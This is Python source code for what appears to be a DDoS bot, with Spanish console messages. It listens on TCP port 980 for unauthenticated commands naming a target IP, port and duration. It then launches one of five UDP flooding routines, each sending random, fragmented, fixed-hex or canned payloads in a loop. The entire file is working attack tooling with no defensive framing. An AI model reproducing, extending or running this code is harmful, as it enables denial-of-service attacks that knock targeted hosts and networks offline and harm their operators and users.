import socket
import threading
import time
import random

BOT_HOST = '0.0.0.0'
BOT_PORT = 980

def udp_flood(target, port, duration):
    timeout = time.time() + int(duration)
    sent = 0
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_ = random._urandom(1024)
            sock.sendto(bytes_, (target, int(port)))
            sent += 1
        except Exception:
            continue

def udp_bypass(target, port, duration):
    timeout = time.time() + int(duration)
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_ = random._urandom(random.randint(1024, 4096))
            sock.sendto(bytes_, (target, int(port)))
        except Exception:
            continue

def udp_hex(target, port, duration):
    timeout = time.time() + int(duration)
    payload = bytes.fromhex("53414d5090d91d4d611e700a465b00")
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (target, int(port)))
        except Exception:
            continue

def udp_fragmented(target, port, duration):
    timeout = time.time() + int(duration)
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            size = random.randint(32, 128)
            bytes_ = random._urandom(size)
            sock.sendto(bytes_, (target, int(port)))
        except Exception:
            continue

def udp_payload(target, port, duration):
    timeout = time.time() + int(duration)
    payloads = [
        b'GET / HTTP/1.1\r\nHost: google.com\r\n\r\n',
        b'\x00' * 1400,
        b'0' * 512,
        b'X' * 1024
    ]
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random.choice(payloads)
            sock.sendto(data, (target, int(port)))
        except Exception:
            continue

def handle_client(conn, addr):
    try:
        data = conn.recv(1024).decode('utf-8').strip()
        print(f"[+] Comando recibido de {addr}: {data}")
        parts = data.split()
        if len(parts) < 4:
            conn.sendall(b"Comando Invalido\n")
            conn.close()
            return
        cmd, ip, port, duration = parts[0], parts[1], parts[2], parts[3]
        if cmd == "UDPFLOOD":
            threading.Thread(target=udp_flood, args=(ip, int(port), int(duration)), daemon=True).start()
            conn.sendall(b"UDPFLOOD lanzado\n")
        elif cmd == "UDPBYPASS":
            threading.Thread(target=udp_bypass, args=(ip, int(port), int(duration)), daemon=True).start()
            conn.sendall(b"UDPBYPASS lanzado\n")
        elif cmd == "UDPHEX":
            threading.Thread(target=udp_hex, args=(ip, int(port), int(duration)), daemon=True).start()
            conn.sendall(b"UDPHEX lanzado\n")
        elif cmd == "UDPFRAGMENTED":
            threading.Thread(target=udp_fragmented, args=(ip, int(port), int(duration)), daemon=True).start()
            conn.sendall(b"UDPFRAGMENTED lanzado\n")
        elif cmd == "UDPPAYLOAD":
            threading.Thread(target=udp_payload, args=(ip, int(port), int(duration)), daemon=True).start()
            conn.sendall(b"UDPPAYLOAD lanzado\n")
        else:
            conn.sendall(b"Comando desconocido\n")
    except Exception as e:
        try:
            conn.sendall(f"Error: {e}\n".encode())
        except:
            pass
    finally:
        conn.close()

def main():
    print(f"[+] Bot escuchando en {BOT_HOST}:{BOT_PORT}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BOT_HOST, BOT_PORT))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
